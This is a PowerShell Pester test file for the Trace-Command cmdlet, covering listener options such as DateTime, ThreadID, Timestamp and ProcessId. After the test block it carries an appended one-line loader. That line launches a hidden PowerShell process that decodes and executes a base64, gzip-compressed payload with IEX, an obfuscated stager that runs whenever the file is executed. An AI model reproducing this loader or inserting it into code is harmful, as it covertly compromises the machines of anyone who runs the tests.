

Describe "Trace-Command" -tags "Feature" {

    Context "Listener options" {
        BeforeAll {
            $logFile = setup -f traceCommandLog.txt -pass
            $actualLogFile = setup -f actualTraceCommandLog.txt -pass
        }

        AfterEach {
            if ( test-path $logfile ) { Remove-Item $logFile }
            if ( test-path $actualLogFile ) { Remove-Item $actualLogFile }
        }

        It "LogicalOperationStack works" -pending:($IsCoreCLR) {
            $keyword = "Trace_Command_ListenerOption_LogicalOperationStack_Foo"
            $stack = [System.Diagnostics.Trace]::CorrelationManager.LogicalOperationStack
            $stack.Push($keyword)

            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption LogicalOperationStack -FilePath $logfile

            $log = Get-Content $logfile | Where-Object {$_ -like "*LogicalOperationStack=$keyword*"}
            $log.Count | Should -BeGreaterThan 0
        }

        It "Callstack works" -pending:($IsCoreCLR) {
            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption Callstack -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*Callstack=   * System.Environment.GetStackTrace(Exception e, Boolean needFileInfo)*"}
            $log.Count | Should -BeGreaterThan 0
        }

        It "Datetime works" {
            $expectedDate = Trace-Command -Name * -Expression {Get-Date} -ListenerOption DateTime -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*DateTime=*"}
            $results = $log | ForEach-Object {[DateTime]::Parse($_.Split("=")[1])}

            
            $allowedGap = [timespan](60 * 1000 * 1000)
            $results | ForEach-Object {
                    $actualGap = $_ - $expectedDate;
                    if ($expectedDate -gt $_)
                    {
                        $actualGap = $expectedDate - $_;
                    }

                    $allowedGap | Should -BeGreaterThan $actualGap
                }
        }

        It "None options has no effect" {
            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption None -FilePath $actualLogfile
            Trace-Command -name * -Expression {write-output Foo} -FilePath $logfile

            Compare-Object (Get-Content $actualLogfile) (Get-Content $logfile) | Should -BeNullOrEmpty
        }

        It "ThreadID works" {
            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption ThreadId -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*ThreadID=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}

            $results | ForEach-Object { $_ | Should -Be ([threading.thread]::CurrentThread.ManagedThreadId) }
        }

        It "Timestamp creates logs in ascending order" {
            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption Timestamp -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*Timestamp=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}
            $sortedResults = $results | Sort-Object
            $sortedResults | Should -Be $results
        }

        It "ProcessId logs current process Id" {
            Trace-Command -Name * -Expression {write-output Foo} -ListenerOption ProcessId -FilePath $logfile
            $log = Get-Content $logfile | Where-Object {$_ -like "*ProcessID=*"}
            $results = $log | ForEach-Object {$_.Split("=")[1]}

            $results | ForEach-Object { $_ | Should -Be $pid }
        }
    }
}

if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGImx1cCA7VWbW/aSBD+nEr9D1aFZFt1MBDSNJEq3RpwILwEcDABik4be20WFi+x1+Gl7X+/MdgpUdNe705ngby787KzzzyzYy8OHEF5IG0cMmwy6cvbNyddHOKlpOScxmI8mBVLmpR79NYb9eQEhDlWOj9n9bOHLTNm0idJmaDVqsqXmAbTq6tKHIYkEId5/poIFEVk+cAoiRRV+ioNZyQkp7cPc+II6YuU+zN/zfgDZqnatoKdGZFOUeAmshZ3cBJc3loxKhT582dZnZwWp/naY4xZpMjWNhJkmXcZk1Xpm5pseLddEUVuUyfkEfdEfkiDs1J+EETYIx3w9kTaRMy4G8kqnAZ+IRFxGEgvzpU4OqgpMgy7IXeQ64YkAqt8I3jiC6LkgpgxTfpDmaRR9ONA0CUBuSAhX1kkfKIOifJ1HLiM9Ik3VTpknR3+d42UYyPQ6opQ1SA5vwi3zd2YkYMHWf0x4OfEqvBkyQU0vr198/aNlxEibBaP2QCjk8l+TCBSpcsjulf7JBU0qQ17YcHDLUxzd2FM1Kk0STIxmU7Bv4Pa0WU4D7SfOylmFqAf9YsXDukO+pYLkonNqTsFyzRfOWFvzM4c+wucSH/OvirxaECq2wAvqZMRTHktB8RjZH/ofKbWgQgVORUQt0oY8bFI0NSkyY9mtSUVz7ZGTJlLQuRAHiOIClKsvgzmkCBFbgRtsgTUDnMZUuEBrUmmnVJ5m+2ezEFJrjAcRZrUjaGuHE2yCGbE1SQURDQVoVjw/VD+Hm47ZoI6OBKZu6n6Es101woPIhHGDqQTELizVsShmCWAaFKdusTYWtTPdpdfhaOCGaOBD56eIB2wksBgiYQkoasdEULNW0Q0litGlqC4r3WTYR8qO62LPbWwT1z59WAz1h8onoCToXIUKmTcYlxokk1DARdHAvQRx/5DQEfXx1FolZCk2VKyqpoYW5EUQ050UX/XKY8T6qbA7WEKBUBkhnxp4Ih8KFsiBACVd/otrSB4Ro2AtR1jQYtoTYuNNvwH9KzBqxdu82Ze18PqZuahRtRo17vVXr1efrqx7LKwag3R7DZEu3Y/n1uo3h+MxLiB6ne0sBiVd6sburNayB1t9A87Y7cuGJvd3He9UdXz/AvP6hfPTdoaVnpGoYRb1VrcGhpro1COanRd79FBb3FjioeRzfDA0/374iWmm1Y4t4u8vWsgdD07c3Y3nn09a7vbUV2/HJYXqIZQJajZpsGbIyNEXd3Gvs3XTd+oDP0KMkyHknFvYBq9nmmgwfX8sXqp+2B7j2fG0C7R8eq+P4O5CSE09UK54ZIdH/UApGuOsN8HHb9ScmYe6FTfI+N9h0clvDA4MkDHHD9CXKOV2WUgvxuUOLJZ5x6j1nhr6npx1C2jeoEOr32UuMS+0cMoeqruqnrRdrk7PO+MPN2+Zxd6tXK3cjxd19f1atMZFzcfby8+tobUXnI00HX7XcIQoEhuXbxdHeX7Z1d+G4fRDDPgAdzhWZGaPDTTG7nLaWKhKGmrXpAwIAyaG7S/jNqIMe4k/SG5vaE1HRrGFKp0AMOz0qsjVXpWVL+3i2zp6moMYUKRZNTNt0jgi5lW2JwVCnD5FzblAhz1949X4aut8uxOSxrIHqPjPdh+DzWpnRwTj0Oza/n/N4Zp3c7g5f4Nht/XfiH9LVwL2uHsPyy/XPhHAP+Lsw8xFaBrwa3DyKE9vgpBypijr4osO8AHL32SL73bWJx24IPjL80j3eZhCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);

